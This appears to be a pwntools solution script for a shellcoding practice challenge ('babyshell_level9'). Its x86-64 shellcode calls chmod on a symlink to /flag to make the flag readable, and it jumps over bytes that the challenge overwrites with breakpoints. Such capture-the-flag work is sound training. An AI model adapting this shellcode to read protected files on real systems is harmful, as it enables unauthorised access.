#using a symbloic link will be much better coz it takes much less bytes 

from pwn import *
context.arch = 'amd64'
context.log_level='Debug'

print(len(asm("""
push 0x67
mov rdi, rsp
push 4

"""
)))
# g is a symbloic link to /flag
#need  to bypass next 10 bytes after push that will be made to int 3
file_path = "g"
shellcode="""
    push 0x67
    mov rdi, rsp
    push 4
    pop rsi
    jmp next

    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
    nop
next:
    push 0x5a
    pop rax
    syscall
    """
shellcode = asm(shellcode)

print(len(shellcode))
"""
for debug


with open('shell.bin','wb) as f:
    f.write(asm)
exit(1)

"""




# Execute the shellcode
p = process(['/challenge/babyshell_level9'])  

p.recv()
p.send(shellcode)
#p.recvall()
p.interactive()
print("[+] END")
